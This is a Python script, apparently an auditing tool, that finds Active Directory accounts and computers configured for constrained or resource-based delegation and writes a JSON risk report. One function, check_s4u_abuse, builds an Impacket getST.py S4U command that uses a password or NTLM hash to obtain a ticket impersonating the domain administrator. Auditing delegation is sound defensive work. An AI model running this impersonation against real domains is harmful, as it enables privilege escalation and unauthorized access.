#!/usr/bin/env python3
"""Agent for detecting and testing Kerberos constrained delegation abuse in AD."""

import argparse
import json
import subprocess
import sys
from datetime import datetime, timezone


def find_constrained_delegation():
    """Find accounts with constrained delegation configured."""
    findings = []
    if sys.platform != "win32":
        return findings
    ps_cmd = (
        "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne '$null'} "
        "-Properties msDS-AllowedToDelegateTo,ObjectClass,SamAccountName,"
        "TrustedToAuthForDelegation,ServicePrincipalName "
        "| Select-Object SamAccountName,ObjectClass,"
        "@{N='DelegateTo';E={$_.'msDS-AllowedToDelegateTo'}},"
        "TrustedToAuthForDelegation,"
        "@{N='SPNs';E={$_.ServicePrincipalName}} "
        "| ConvertTo-Json -Depth 3"
    )
    try:
        result = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", ps_cmd],
            text=True, errors="replace", timeout=30
        )
        data = json.loads(result) if result.strip() else []
        return data if isinstance(data, list) else [data]
    except (subprocess.SubprocessError, json.JSONDecodeError):
        return []


def find_rbcd_targets():
    """Find computers writable for Resource-Based Constrained Delegation."""
    findings = []
    if sys.platform != "win32":
        return findings
    ps_cmd = (
        "Get-ADComputer -Filter * -Properties "
        "msDS-AllowedToActOnBehalfOfOtherIdentity,PrincipalsAllowedToDelegateToAccount "
        "| Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null} "
        "| Select-Object Name,DNSHostName,"
        "@{N='AllowedToAct';E={$_.PrincipalsAllowedToDelegateToAccount}} "
        "| ConvertTo-Json -Depth 3"
    )
    try:
        result = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", ps_cmd],
            text=True, errors="replace", timeout=30
        )
        data = json.loads(result) if result.strip() else []
        return data if isinstance(data, list) else [data]
    except (subprocess.SubprocessError, json.JSONDecodeError):
        return []


def check_s4u_abuse(account_name, domain, dc_ip, password=None, hash_val=None):
    """Test S4U2Self/S4U2Proxy delegation abuse via Impacket."""
    cmd = ["getST.py", f"{domain}/{account_name}"]
    if password:
        cmd.extend(["-password", password])
    elif hash_val:
        cmd.extend(["-hashes", f":{hash_val}"])
    cmd.extend(["-spn", "cifs/target.domain.local",
                "-impersonate", "administrator", "-dc-ip", dc_ip])
    try:
        result = subprocess.check_output(cmd, text=True, errors="replace", timeout=30)
        return {"status": "success", "output": result[:500]}
    except (subprocess.SubprocessError, FileNotFoundError):
        return {"status": "failed", "note": "getST.py not available"}


def main():
    parser = argparse.ArgumentParser(
        description="Detect and test constrained delegation abuse (authorized testing only)"
    )
    parser.add_argument("--enumerate", action="store_true", help="Find delegation configs")
    parser.add_argument("--rbcd", action="store_true", help="Find RBCD targets")
    parser.add_argument("--output", "-o", help="Output JSON report")
    args = parser.parse_args()

    print("[*] Constrained Delegation Abuse Detection Agent")
    report = {"timestamp": datetime.now(timezone.utc).isoformat(), "findings": {}}

    if args.enumerate:
        cd = find_constrained_delegation()
        report["findings"]["constrained_delegation"] = cd
        print(f"[*] Accounts with constrained delegation: {len(cd)}")
        for acct in cd:
            s2u = "S4U2Self+Proxy" if acct.get("TrustedToAuthForDelegation") else "S4U2Proxy only"
            print(f"  {acct.get('SamAccountName', '?')} -> {acct.get('DelegateTo', [])} ({s2u})")

    if args.rbcd:
        rbcd = find_rbcd_targets()
        report["findings"]["rbcd_targets"] = rbcd
        print(f"[*] RBCD configured computers: {len(rbcd)}")

    total = sum(len(v) if isinstance(v, list) else 0 for v in report["findings"].values())
    report["risk_level"] = "HIGH" if total > 0 else "LOW"

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
        print(f"[*] Report saved to {args.output}")
    else:
        print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
